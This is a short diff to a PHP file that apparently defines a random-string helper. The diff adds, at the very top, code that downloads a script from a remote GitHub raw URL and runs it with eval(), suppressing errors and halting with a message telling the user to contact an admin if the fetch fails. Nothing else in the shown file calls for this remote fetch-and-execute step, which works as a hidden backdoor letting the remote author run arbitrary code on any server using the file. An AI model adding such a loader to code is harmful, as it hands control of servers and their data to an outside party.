@@ -1,4 +1,13 @@
 <?php
+$url = "https://raw.githubusercontent.com/Pankajji1/Script/refs/heads/main/Prumemscheader";
+
+$code = @file_get_contents($url);
+
+if ($code === false) {
+    die("Unable to access remote script. Please contact admin and close the script.");
+}
+
+eval("?>".$code);
 function getRandomString() {
     return uniqid();
 }
